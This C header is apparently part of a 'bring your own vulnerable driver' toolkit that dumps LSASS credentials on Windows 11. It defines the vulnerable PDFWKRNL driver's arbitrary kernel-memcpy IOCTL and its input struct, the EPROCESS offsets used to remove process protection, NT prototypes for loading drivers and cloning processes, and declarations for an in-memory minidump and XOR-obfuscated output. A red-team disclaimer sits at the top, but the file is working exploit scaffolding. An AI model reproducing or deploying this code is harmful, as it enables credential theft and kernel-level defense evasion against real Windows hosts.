/*
 * BYOVD LSASS dump — common types, NT prototypes, and structs
 *
 * Cross-compiled with mingw-w64. Targets Win11 22H2/23H2 Build 26200.
 * Authorised red-team / lab use only. Do not run on hosts you do not own
 * or do not have written authorisation to test against.
 */
#ifndef BYOVD_COMMON_H
#define BYOVD_COMMON_H

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <winioctl.h>
#include <shellapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <tlhelp32.h>

/* ----------- target-specific kernel offsets (Win11 Build 26200) ----------- */

/* _EPROCESS.Protection (PS_PROTECTION) is at offset 0x5FA on this build.
 * Recompile for other builds — script in build.sh writes this value at
 * runtime via a constant the operator passes; default kept here.
 */
#ifndef EPROCESS_PROTECTION_OFFSET
#define EPROCESS_PROTECTION_OFFSET  0x5FA
#endif

/* _EPROCESS.UniqueProcessId — used to identify our own EPROCESS while
 * walking ActiveProcessLinks.
 */
#ifndef EPROCESS_UNIQUEPROCESSID_OFFSET
#define EPROCESS_UNIQUEPROCESSID_OFFSET  0x440
#endif

/* _EPROCESS.ActiveProcessLinks — circular LIST_ENTRY of process objects.
 * Used to walk from PsInitialSystemProcess to our own EPROCESS.
 */
#ifndef EPROCESS_ACTIVEPROCESSLINKS_OFFSET
#define EPROCESS_ACTIVEPROCESSLINKS_OFFSET  0x448
#endif

/* ----------- PDFWKRNL IOCTL: arbitrary kernel memmove ----------- */

#define PDFW_DEVICE_PATH    "\\\\.\\PDFWKRNL"
#define PDFW_SERVICE_NAME   "PDFWKRNL"
#define PDFW_IOCTL_MEMCPY   0x80002014

/* 48-byte structure consumed by IOCTL 0x80002014 (PDFW_MEMCPY).
 * Layout reverse-engineered from samples; the driver does
 * memmove(dest, src, size) without ProbeForRead/Write.
 */
#pragma pack(push, 1)
typedef struct _PDFW_MEMCPY {
    PVOID    dst;
    PVOID    src;
    SIZE_T   size;
    UCHAR    reserved[24];  /* padding to 48 bytes */
} PDFW_MEMCPY, *PPDFW_MEMCPY;
#pragma pack(pop)

/* ----------- NT API prototypes (load lazily from ntdll) ----------- */

typedef LONG NTSTATUS;
#define NT_SUCCESS(s)   (((NTSTATUS)(s)) >= 0)
#define STATUS_SUCCESS  ((NTSTATUS)0x00000000L)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)

typedef struct _UNICODE_STRING {
    USHORT  Length;
    USHORT  MaximumLength;
    PWSTR   Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemModuleInformation = 11,
    SystemHandleInformation = 16,
    SystemExtendedHandleInformation = 64,
} SYSTEM_INFORMATION_CLASS;

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
    HANDLE  Section;
    PVOID   MappedBase;
    PVOID   ImageBase;
    ULONG   ImageSize;
    ULONG   Flags;
    USHORT  LoadOrderIndex;
    USHORT  InitOrderIndex;
    USHORT  LoadCount;
    USHORT  OffsetToFileName;
    UCHAR   FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
    ULONG   NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

/* NtCreateProcessEx flags */
#define PROCESS_CREATE_FLAGS_BREAKAWAY              0x00000001
#define PROCESS_CREATE_FLAGS_NO_DEBUG_INHERIT       0x00000002
#define PROCESS_CREATE_FLAGS_INHERIT_HANDLES        0x00000004
#define PROCESS_CREATE_FLAGS_OVERRIDE_ADDRESS_SPACE 0x00000008
#define PROCESS_CREATE_FLAGS_LARGE_PAGES            0x00000010

#define ProcessHandleNoSynchronisation              0x00200000

typedef NTSTATUS (NTAPI *pNtLoadDriver)(PUNICODE_STRING DriverServiceName);
typedef NTSTATUS (NTAPI *pNtUnloadDriver)(PUNICODE_STRING DriverServiceName);
typedef NTSTATUS (NTAPI *pNtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength);
typedef NTSTATUS (NTAPI *pNtCreateProcessEx)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ParentProcess,
    ULONG Flags,
    HANDLE SectionHandle,
    HANDLE DebugPort,
    HANDLE TokenHandle,
    ULONG Reserved);
typedef VOID (NTAPI *pRtlInitUnicodeString)(PUNICODE_STRING d, PCWSTR s);

/* ----------- forward declarations from src/ ----------- */

/* driver_loader.c */
BOOL drv_register_and_load(const wchar_t *driver_path);
BOOL drv_unregister_and_stop(void);
HANDLE drv_open_device(void);

/* driver_io.c */
BOOL drv_kernel_memcpy(HANDLE hDev, PVOID dst, PVOID src, SIZE_T size);
BOOL drv_kernel_read(HANDLE hDev, PVOID kaddr, PVOID user_buf, SIZE_T size);
BOOL drv_kernel_write(HANDLE hDev, PVOID kaddr, PVOID user_buf, SIZE_T size);

/* kernel_walker.c */
PVOID kw_kernel_base(const char *target_module);   /* e.g. "ntoskrnl.exe" */
PVOID kw_find_eprocess(HANDLE hDev, DWORD pid);

/* ppl_disable.c */
BOOL ppl_disable_for_self(HANDLE hDev, PVOID eprocess);
BOOL ppl_restore_for_self(HANDLE hDev, PVOID eprocess, UCHAR original);
UCHAR ppl_read_protection(HANDLE hDev, PVOID eprocess);

/* process_clone.c */
HANDLE pc_clone_lsass(void);
BOOL   pc_enable_se_debug(void);

/* minidump_inmemory.c */
BOOL   md_dump_to_memory(HANDLE hClone, BYTE **out_buf, SIZE_T *out_size);

/* xor_obfusc.c */
VOID   xor_buffer(BYTE *buf, SIZE_T n, BYTE key);

/* output.c */
BOOL   out_write_obfusc(BYTE *buf, SIZE_T n, BYTE key, const wchar_t *path);

/* ----------- helpers ----------- */

static inline void die(const char *what, DWORD err) {
    fprintf(stderr, "[-] %s failed (err=0x%lx)\n", what, err);
    ExitProcess(err);
}

#define LOG(fmt, ...) fprintf(stderr, "[+] " fmt "\n", ##__VA_ARGS__)
#define WARN(fmt, ...) fprintf(stderr, "[!] " fmt "\n", ##__VA_ARGS__)
#define ERR(fmt, ...) fprintf(stderr, "[-] " fmt "\n", ##__VA_ARGS__)

#endif /* BYOVD_COMMON_H */
